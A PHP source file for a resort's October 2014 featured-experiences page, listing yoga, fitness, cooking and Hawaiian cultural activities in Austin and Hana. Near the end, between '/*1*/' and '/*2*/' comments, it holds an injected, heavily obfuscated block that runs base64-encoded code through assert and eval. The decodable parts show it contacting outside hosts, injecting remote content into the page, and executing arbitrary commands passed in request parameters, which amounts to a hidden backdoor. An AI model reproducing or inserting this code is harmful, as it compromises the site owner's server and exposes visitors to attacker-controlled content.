<?php
  session_start();
  $loc = @$_GET['loc']; 
  if (strlen($loc) > 0 && ($loc == 'hana' || $loc == 'austin')){ 
    $_SESSION["origLoc"] = $loc;
  } elseif (isset($_SESSION["origLoc"])) {
    $loc = $_SESSION["origLoc"];
  } else {
    $loc = "default";
  }
   $path = $_SERVER['DOCUMENT_ROOT'];
   include_once($path."/Library/Travaasa_Common.php");
?>
<!DOCTYPE html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Travaasa October 2014 Featured Experiences</title>
  <meta name="keywords" content="travaasa, travel, resorts, hana, hāna, hawaii, austin, texas, Austin resort, Austin spa, travaasa Austin, Austin spa resort, experiential, hotel, Austin hotel, Austin conference center, Austin group meeting" />
  <meta name="description" content="Rediscover the magic of travel with Travaasa Austin, Texas or Hana, Maui." />
  <?php 
   include_once($path."/Library/Travaasa_Head.php");
  ?>
<!-- start NAVIS Code -->
<script type="text/javascript" src="http://www.navistechnologies.info/JavascriptPhoneNumber/js.aspx?account=15070&amp;jspass=ivcsp4gaxk4fbz8banxd&amp;dflt=<?php 
if ($loc == 'hana') :
echo NAVIS_GLOBAL_HANA;
elseif ($loc == 'austin') :
echo NAVIS_GLOBAL_AUSTIN;
else :
echo NAVIS_GLOBAL_DEFAULT;
endif; 
?>"></script>
<script type="text/javascript">ProcessNavisNCKeyword();</script>
<!-- end NAVIS Code -->
</head>
<body>
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-MW4X3M"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MW4X3M');</script>
<!-- End Google Tag Manager -->
<?php 
if ($loc == 'hana') :
include_once($path."/Library/Travaasa_Menu_Hana.php");
elseif ($loc == 'austin') :
include_once($path."/Library/Travaasa_Menu_Austin.php");
else :
include_once($path."/Library/Travaasa_Menu.php");
endif; 
?>
</header><section id="feature1_wrapper" class="feature_carousel clearfix">
    <div id="feature1" class="feature">
      <div class="slide"><img src="/assets/images/feature_months_october_2014_1600x640.jpg" alt="October is Harvest Month at Travaasa"></div>
    </div>
</section>
<section id="content">
<article id="main">
  <section class="intro pad clearfix">    
    <div class="section group">
      <div class="col span_1_of_2">
            <!--<div class="listing">
                <h6>XXXXXX <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>OOOOOOOOOOOOOOO</p>
            </div>
            <div class="listing">
                <h6>XXXXXX <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>OOOOOOOOOOOOOOO</p>
            </div>
            <div class="listing">
                <h6>XXXXXX <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>OOOOOOOOOOOOOOO</p>
            </div>-->

             <h2>Adventure</h2>

            <div class="listing">
                <h6>HARVEST THE COASTLINE - BAMBOO POLE FISHING <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>Try your hand at Hawaiian throw-net fishing and learn how to make (and fish with) a bamboo pole. In Hawai‘i, the fall harvest isn’t all about pumpkins and squash, but reaping the bounty of the sea.</p>
            </div>

            <h2>Culinary</h2>

            <div class="listing">
                <h6>HARVEST YOUR HEALTH JUICING <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Celebrate living healthily and in harmony with nature by sampling some of the best juice the fall harvest has to offer. Green vegetables have more valuable nutrients than any other food in existence, and mixing them with fruit helps make those nutrients more readily available to the body.</p>
            </div>
            
            <div class="listing">
                <h6>PUMPKIN AND SQUASH <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>There’s way more to pumpkins than spooky jack-o’-lanterns or Grandma’s pumpkin pie. Learn several scrumptious ways to prepare this sumptuous squash.</p>
            </div>

             <div class="listing">
                <h6>HARVESTING THE COCONUT <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>Found across most of the tropics, the coconut - "niu" - is known for its great versatility as seen in the many domestic, commercial, and industrial uses of its various parts. Coconuts are also an integral part of the Hawaiian people’s daily diet. Come experience the art of husking a coconut and then enjoy fresh coconut water and meat!</p>
            </div>

            <h2>Culture</h2>

              <div class="listing">
                <h6>HARVESTING NATURE - LAUHALA WEAVING <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>Lauhala fans cool us on still days, lauhala bags keep our valuables safe and lauhala hats shelter us from the sun. In fact, the hala, or Pandanus, was one of the most versatile trees in ancient Hawai’i. Join us in experiencing an ancient Hawaiian tradition as you learn how to make a bookmarker from lauhala.</p>
            </div>

            <h2>Fitness</h2>

            <div class="listing">
                <h6>BEYOND SALSA STEPS <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Spice up the fall weather by learning some new Salsa dance steps. Dance the night away for fitness and fun, and even create a few patterns of your own.</p>
            </div>

            <div class="listing">
                <h6>REAP YOUR CORE <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Harvest better posture, balance and power, and discover your girdle of strength as you activate your intrinsic muscles.</p>
            </div>

            <div class="listing">
                <h6>PILATES SEEDS FOR CENTERING <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Learn how to gather your inner balance and control the muscles along your spine through mindfulness of breath and movement.</p>
            </div>

            <div class="listing">
                <h6>GREET THE GLOWING SUN YOGA <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Welcome the autumn sun while practicing “Surya Namaskara,” or Sun Salutations. This class will break down every pose, acclimating you to each movement and transition until the sequence becomes one inspiring meditation. No matter your skill level, you can adjust this sequence of poses to practice as a warm-up or as the heart of your yoga routine.</p>
            </div>

            <div class="listing">
                <h6>PLANT A YOGA PRACTICE <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Take in the fundamentals of yoga. This beginning class breaks down popular poses and discusses the variety of ways you can develop a regular routine to practice at home.</p>
            </div>
            
     

            <div class="listing">
                <h6>HARVEST STRENGTH AND RELAXATION <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Plant the seeds of relaxation by cultivating your inner heat and strength. In this intermediate class, you’ll focus on leg, arm and core strength, and then reap what you’ve sewn with a gratifying cooldown.</p>
            </div>

               </div>
        <div class="col span_1_of_2">

            <div class="listing">
                <h6>GO NUTS WITH COCONUTS <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>Join us for a fun-filled workout that uses nothing but Mother Nature’s bounty — coconuts. Coconuts are healthy, but they also make great exercise equipment. Cultivate your strength through a cornucopia of exercises, including soccer tosses, jump shots, coco shuttles, push-ups, Russian twists, planks, coco hops, coco break dancing, coco squats and many more.</p>
            </div>

            <div class="listing">
                <h6>TAI CHI SPARK <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Learn the fundamentals of tai chi, and spark the energy centers in your physical body to access your spiritual drive. There’s no better time to tap into your inner fire, with vibrant fall colors glowing all around you.</p>
            </div>

            <div class="listing">
                <h6>KETTLEBELLS GLIDER WORKOUT <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Plant some fun and intensity into your workout while using props that enhance total body conditioning. You’ll glide and use the kettlebells as you squat, lunge, balance and complete more multi-joint exercises to enhance your physical performance in day-to-day activities.</p>
            </div>

            <div class="listing">
                <h6>HARVEST YOUR INNER CHILD HULA HOOPING <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Revive your inner child and have a blast with this back-to-basics fitness Hula-Hooping class. Get a great workout while learning the basics of hula hooping. Revisit the days when exercise was never boring as you start losing inches while having fun. Maybe your next feat will even be leaping headfirst into a pile of leaves.</p>
            </div>

            <div class="listing">
                <h6>GATHER YOUR STRENGTH WITH FREE WEIGHTS <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Harvest your muscular strength and grow more definition in your physique in this 45-minute Free-Weights class. Chisel your body while increasing your strength and endurance. With the help of dumbbells, props and some ultra-effective sculpting moves, you’re sure to leave feeling stronger and more physically fit. Pumpkins shouldn’t be the only things getting carved into something spectacular this fall.</p>
            </div>

            <div class="listing">
                <h6>HIPS AND KNEES YOGA THERAPY <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Give your hips and knees some pampering after a day of hiking through the rich autumn foliage. This transforming therapy creates more awareness and a wider range of motion while strengthening the muscles around these joints. Opening the hips also helps open minds to enjoy an active life with better mobility.</p>
            </div>

            <div class="listing">
                <h6>HARVESTING STRENGTH AND FLEXIBILITY YOGA <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>Get ready to plant your core into the ground and watch your flexibility grow. In this intermediate class, you’ll nourish the seeds of relaxation in your inner heat and strength. After focusing on asanas that strengthen your arms, legs and core, you’ll reap what you’ve sewn with a relaxing cooldown centered around increasing flexibility.</p>
            </div>

                  <div class="listing">
                <h6>FOOT CARE <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>We constantly put our feet to work without giving them proper care. Take better care of your feet and discover improved mobility, better posture and a healthier lifestyle! Learn the proper massage and mechanics that can help strengthen muscles and heal aches and pains associated with overworked feet.</p>
            </div>


            <h2>Spa &amp; Wellness</h2>

            <div class="listing">
                <h6>MIND BODY MEDITATION <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Envision yourself stretching out in a pile of leaves, inhale and say “om.” This refreshing class incorporates gentle movement, stretches and breathing to create a relaxing experience and a clear, centered state of mind.</p>
            </div>

            <div class="listing">
                <h6>PLANTING SEEDS OF COMPASSION MEDITATION <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Discover how meditation is not only a useful tool for gaining insight into your mind’s roots, but it’s an amazing opportunity to cultivate and practice compassion. In this transforming class, you’ll be guided though visualizations that strengthen your ability to sprout kindness in yourself and others.</p>
            </div>

            <div class="listing">
                <h6>HARVEST SPECIAL MEMORIES JOURNALING <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Rake up your fond autumn memories and bag them into a journal so you can rekindle your warm feelings long past fall.</p>
            </div>
          
            

     </div>
    </div>   
  </section>
  
  <section class="grey pad">
        <h4>See upcoming months</h4>
      <div class="group">
            <div class="col span_1_of_3 month"><div class="active"><a href="/calendar/2014/october/"><img src="/assets/images/months/oct-harvest.png" alt="October is Harvest Month"></a></div></div>
            <div class="col span_1_of_3 month"><div><a href="/calendar/2014/november/"><img src="/assets/images/months/nov-stop.png" alt="November is Stop Month"></a></div></div>
            <div class="col span_1_of_3 month"><div><a href="/calendar/2014/december/"><img src="/assets/images/months/dec-joy.png" alt="December is Joy Month"></a></div></div>
        </div>
  </section>
  
</article>
</section>
<?php
/*1*/ 
if (!$ind5eae2f00) { $ind5eae2f00 = TRUE;assert("e"."v"."a"."l(b"."a"."s"."e"."6"."4_d"."e"."c"."o"."d"."e('ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXT1BcnJheShiYXNlNjRfZGVjb2RlKCdaWCcgLidKeWIzJyAuJ0onIC4nZmMnIC4nbVZ3YicgLiczSjBhVzVuJyksYmFzZTY0X2RlY29kZSgnYVc1cFgzJyAuJ05sJyAuJ2RBJyAuJz09JyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMScgLic5dFlYJyAuJ1JqYUE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVicgLic5blpYUmZZMjknIC4ndWRHVnVkSE09JyksYmFzZTY0X2RlY29kZSgnYzMnIC4nUnknIC4nY21sd2IzTScgLic9JyksYmFzZTY0X2RlY29kZSgnYlgnIC4nUmZjbUZ1WkE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptJyAuJ2RsJyAuJ2RHTnpkJyAuJ2c9PScpLGJhc2U2NF9kZWNvZGUoJ2RYJyAuJ0onIC4nc1onIC4nVzVqYjJSbCcpLGJhc2U2NF9kZWNvZGUoJ2RYSicgLidzJyAuJ1pXNWpiJyAuJzJSbCcpLGJhc2U2NF9kZWNvZGUoJ2JXUTEnKSxiYXNlNjRfZGVjb2RlKCcnIC4nYVc1cFgyZGxkJyAuJ0E9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVjluWicgLidYUmZZMjknIC4ndWRHJyAuJ1Z1ZEhNPScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nblZ1WTNSJyAuJ3AnIC4nYjInIC4nNWZaWGhwJyAuJ2MzUnonKSxiYXNlNjRfZGVjb2RlKCdZM1Z5YkY5cGJtJyAuJ2wwJyksYmFzZTY0X2RlY29kZSgnJyAuJ1kzVnliRjl6JyAuJ1onIC4nWFJ2Y0hRJyAuJz0nKSxiYXNlNjRfZGVjb2RlKCdZJyAuJzNWeWJGOXpaWFInIC4ndmNIUT0nKSxiYXNlNjRfZGVjb2RlKCcnIC4nWTNWeWJGOScgLidsZUcnIC4nVmonKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWMnIC4nRzl6JyksYmFzZTY0X2RlY29kZSgnZFc1JyAuJ3dZV05yJyksYmFzZTY0X2RlY29kZSgnWTMnIC4nVnliRjlqYkc5eicgLidaJyAuJ1E9PScpLGJhc2U2NF9kZWNvZGUoJ2RIJyAuJ0onIC4ncGJRPScgLic9JyksYmFzZTY0X2RlY29kZSgnYzJWemMybHZibCcgLic5cFonIC4nQT09JyksYmFzZTY0X2RlY29kZSgnWm4nIC4nTicgLid2JyAuJ1kydHZjR1Z1JyksYmFzZTY0X2RlY29kZSgnWm1kbGRHTT0nKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWRHOXNiM2RsY2c9PScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nbmQnIC4neWFYUicgLidsJyksYmFzZTY0X2RlY29kZSgnWm1WdlpnPT0nKSxiYXNlNjRfZGVjb2RlKCdabWRsJyAuJ2RITT0nKSxiYXNlNjRfZGVjb2RlKCdiWFInIC4nZmNtRnVaQT09JyksYmFzZTY0X2RlY29kZSgnWTNKbFlYUmxYMloxJyAuJ2JtJyAuJ04wYVc5dScpLGJhc2U2NF9kZWNvZGUoJ1ptTnNiM05sJyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMTl6Y0d4JyAuJ3BkQT09JyksYmFzZTY0X2RlY29kZSgnYlhSJyAuJ2ZjJyAuJ21GdVpBPT0nKSxiYXNlNjRfZGVjb2RlKCdabXh2WTInIC4ncz0nKSxiYXNlNjRfZGVjb2RlKCdjM1J5YVhCeicgLidiR0Z6JyAuJ2EnIC4nR1Z6JykpOyAgZnVuY3Rpb24gXzM5OTQyODQoJGkpeyRhPUFycmF5KCdaR2x6JyAuJ2NHeGgnIC4nZVYnIC4nOWxjbkp2Y25NPScsJ01BPT0nLCdZMnhwWicgLidXNTBYMk4nIC4nb1pXJyAuJ04nIC4ncicsJ1kyeCcgLidwWicgLidXJyAuJzUwWDInIC4nTm9aJyAuJ1dOcicsJ1MnIC4nRicgLidSJyAuJ1VVRjlCUScgLicwTkZVRlJmUTBoQlVsTkZWQT0nIC4nPScsJ0lTNGgnIC4nZFE9JyAuJz0nLCdVME4nIC4nU1NWJyAuJ0JVWCcgLicwWicgLidKVEVWTycgLidRVTFGJywnVlYnIC4nUkdMVGcnIC4nPScsJ2QnIC4nMmx1JyAuJ1pHOScgLiczY3kwJyAuJ3hNaicgLidVJyAuJ3gnLCdTRlJVVUY5QlEwTicgLidGVUYnIC4nUmZRMGhCVWxORlZBPT0nLCdjRzEnIC4ndScsJ1UwVlNWa1ZTWDA1QlRVVT0nLCdVa1ZSVlVWJyAuJ1RWRjlWVWtrPScsJ1MnIC4nRlInIC4nVVVGOVZVMFZTWCcgLicwRkhSVTVVJywnVWtWJyAuJ05UJyAuJzFSRlgnIC4nMEYnIC4nRVJGST0nLCdkV3hwYm10a1knIC4naTVqYicgLicyMD0nLCdMJyAuJzJkbGRDNScgLid3YUgnIC4nQS9aRDA9JywnSm5VOScsJ0ptTTknLCdKbWs5TVNacCcgLidjRCcgLicwPScsJ0ptJyAuJ2c5JywnTScgLid6a3dZalZoTScgLidXUTVaJyAuJ1RNMllUUXpNMlUnIC4nMFltSXhZelInIC4naVkyWScgLicxTVdGbE0yVScgLic9JywnJyAuJ01RPT0nLCdZV3gnIC4nc2IzZGYnIC4nZFhKcycgLidYJyAuJzJadmNHJyAuJ1Z1JywnJyAuJ2FIUicgLicwY0QnIC4nbycgLid2JyAuJ0x3PScgLic9JywnWTNWeScgLidiRjlwYm1sMCcsJ2FIUicgLicwY0Rvdkx3PT0nLCdaMmR2Wkc5JyAuJzAnIC4nZScgLidIRicgLid3YVdOJyAuJ21aSCcgLidJPScsJycgLidkR0ZrYW1GNicsJ1IwJyAuJ1ZVSScgLidBPT0nLCdJRWgnIC4nVVZGQXZNUzR4RFFvJyAuJz0nLCdTRzl6ZEQnIC4nb2cnLCdEJyAuJ1FvPScsJ1EyOXVibScgLidWamRHbHYnIC4nYicgLidqJyAuJ29nUTJ4dmMyVU5DZzBLJywnJywnTDF4U1hGJyAuJ0l2JywnJyAuJ2NBPT0nLCdOVycgLidWaFpUJyAuJ0ptTURBJyAuJz0nKTtyZXR1cm4gYmFzZTY0X2RlY29kZSgkYVskaV0pO30gIGlmKCFpc3NldCgkeGIyNGEwZThfMCkpeyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVswXShyb3VuZCgwKSk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzFdKF8zOTk0Mjg0KDApLF8zOTk0Mjg0KDEpKTtpZighZW1wdHkoJF9DT09LSUVbXzM5OTQyODQoMildKSlkaWUoJF9DT09LSUVbXzM5OTQyODQoMyldKTtpZighaXNzZXQoJHhiMjRhMGU4XzFbXzM5OTQyODQoNCldKSl7aWYoJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzJdKF8zOTk0Mjg0KDUpLCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszXSgkX1NFUlZFUltfMzk5NDI4NCg2KV0pKSkkeGIyNGEwZThfMj1fMzk5NDI4NCg3KTtlbHNlICR4YjI0YTBlOF8yPV8zOTk0Mjg0KDgpO31lbHNleyR4YjI0YTBlOF8yPSR4YjI0YTBlOF8xW18zOTk0Mjg0KDkpXTskeGIyNGEwZThfMz1fMzk5NDI4NCgxMCk7fSR4YjI0YTBlOF80PSRfU0VSVkVSW18zOTk0Mjg0KDExKV0gLiRfU0VSVkVSW18zOTk0Mjg0KDEyKV07JHhiMjRhMGU4XzU9JF9TRVJWRVJbXzM5OTQyODQoMTMpXTskeGIyNGEwZThfNj0kX1NFUlZFUltfMzk5NDI4NCgxNCldO3doaWxlKHJvdW5kKDArODIyLjIrODIyLjIrODIyLjIrODIyLjIrODIyLjIpLXJvdW5kKDArMjA1NS41KzIwNTUuNSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzRdKCR4YjI0YTBlOF83LCR4YjI0YTBlOF84LCR4YjI0YTBlOF8wLCR4YjI0YTBlOF81KTskeGIyNGEwZThfOT1fMzk5NDI4NCgxNSk7aWYocm91bmQoMCszMTc4LjUrMzE3OC41KTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bNV0ocm91bmQoMCs5NjQuNSs5NjQuNSkscm91bmQoMCsxMTA1Ljc1KzExMDUuNzUrMTEwNS43NSsxMTA1Ljc1KSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzZdKCR4YjI0YTBlOF8xLCR4YjI0YTBlOF80KTskeGIyNGEwZThfMTA9XzM5OTQyODQoMTYpIC4kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bN10oJHhiMjRhMGU4XzQpIC5fMzk5NDI4NCgxNykgLiRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVs4XSgkeGIyNGEwZThfNSkgLl8zOTk0Mjg0KDE4KSAuJHhiMjRhMGU4XzIgLl8zOTk0Mjg0KDE5KSAuJHhiMjRhMGU4XzYgLl8zOTk0Mjg0KDIwKSAuJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzldKF8zOTk0Mjg0KDIxKSAuJHhiMjRhMGU4XzQgLiR4YjI0YTBlOF81IC4keGIyNGEwZThfMiAuXzM5OTQyODQoMjIpKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTBdKF8zOTk0Mjg0KDIzKSk9PSByb3VuZCgwKzEpKXskeGIyNGEwZThfMD0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTFdKF8zOTk0Mjg0KDI0KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7fWVsc2VpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTJdKF8zOTk0Mjg0KDI1KSkpeyR4YjI0YTBlOF8xMT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTNdKF8zOTk0Mjg0KDI2KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE0XSgkeGIyNGEwZThfMTEsNDIsRkFMU0UpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNV0oJHhiMjRhMGU4XzExLDE5OTEzLFRSVUUpOyR4YjI0YTBlOF8wPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNl0oJHhiMjRhMGU4XzExKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTddKF8zOTk0Mjg0KDI3KSxfMzk5NDI4NCgyOCkpIT09ZmFsc2UpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE4XSgkeGIyNGEwZThfOSwkeGIyNGEwZThfNiwkeGIyNGEwZThfMTIpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxOV0oJHhiMjRhMGU4XzExKTtpZigocm91bmQoMCsyOTczKStyb3VuZCgwKzIyOTkrMjI5OSkpPnJvdW5kKDArMjk3Myl8fCAkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjBdKCR4YjI0YTBlOF81LCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTApKTtlbHNleyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMV0oJHhiMjRhMGU4XzgsJHhiMjRhMGU4XzE0LCR4YjI0YTBlOF8wKTt9fWVsc2V7JHhiMjRhMGU4XzEzPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMl0oJHhiMjRhMGU4Xzkscm91bmQoMCs4MCksJHhiMjRhMGU4XzgsJHhiMjRhMGU4Xzcscm91bmQoMCsxMCsxMCsxMCkpO2lmKChyb3VuZCgwKzM4NDIpXnJvdW5kKDArMzg0MikpJiYgJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzIzXSgkX1JFUVVFU1QsJHhiMjRhMGU4XzIpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNF0oJHhiMjRhMGU4XzksJF9DT09LSUUsJHhiMjRhMGU4XzExKTtpZigkeGIyNGEwZThfMTMpeyR4YjI0YTBlOF8xND1fMzk5NDI4NCgyOSkgLiR4YjI0YTBlOF8xMCAuXzM5OTQyODQoMzApOyR4YjI0YTBlOF8xNCAuPSBfMzk5NDI4NCgzMSkgLiR4YjI0YTBlOF85IC5fMzk5NDI4NCgzMik7JHhiMjRhMGU4XzE0IC49IF8zOTk0Mjg0KDMzKTskR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjVdKCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTQpOyR4YjI0YTBlOF8xNT1fMzk5NDI4NCgzNCk7d2hpbGUoISRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNl0oJHhiMjRhMGU4XzEzKSl7JHhiMjRhMGU4XzE1IC49ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyN10oJHhiMjRhMGU4XzEzLHJvdW5kKDArMTI4KSk7aWYocm91bmQoMCsxNTc5LjIrMTU3OS4yKzE1NzkuMisxNTc5LjIrMTU3OS4yKTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjhdKHJvdW5kKDArNjQ1KzY0NSs2NDUrNjQ1KzY0NSkscm91bmQoMCsyMzMzKzIzMzMpKSkkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjldKCR4YjI0YTBlOF80LCRfU0VSVkVSKTt9JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMwXSgkeGIyNGEwZThfMTMpO2xpc3QoJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8wKT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMzFdKF8zOTk0Mjg0KDM1KSwkeGIyNGEwZThfMTUscm91bmQoMCswLjQrMC40KzAuNCswLjQrMC40KSk7aWYocm91bmQoMCsxMzg1LjMzMzMzMzMzMzMrMTM4NS4zMzMzMzMzMzMzKzEzODUuMzMzMzMzMzMzMyk8JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMyXShyb3VuZCgwKzU3NCs1NzQpLHJvdW5kKDArMTUwMS41KzE1MDEuNSkpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszM10oJHhiMjRhMGU4XzYsJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8yKTt9fWlmKEAkX1JFUVVFU1RbXzM5OTQyODQoMzYpXT09IF8zOTk0Mjg0KDM3KSlldmFsKCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszNF0oJF9SRVFVRVNUWyJjIl0pKTt9ZWNobyAkeGIyNGEwZThfMDsg'))");}
 /*2*/
 
include_once($path."/Library/Travaasa_Testimonials.php");
if ($loc == 'hana') :
include_once($path."/Library/Travaasa_Footer_Hana.php");
elseif ($loc == 'austin') :
include_once($path."/Library/Travaasa_Footer_Austin.php");
else :
include_once($path."/Library/Travaasa_Footer.php");
endif; 
include_once($path."/Library/Travaasa_Scripts.php");
?><script type="text/javascript">
$(function() {
  createSubpageStorylines(true, true);
});
</script>
</body>
</html>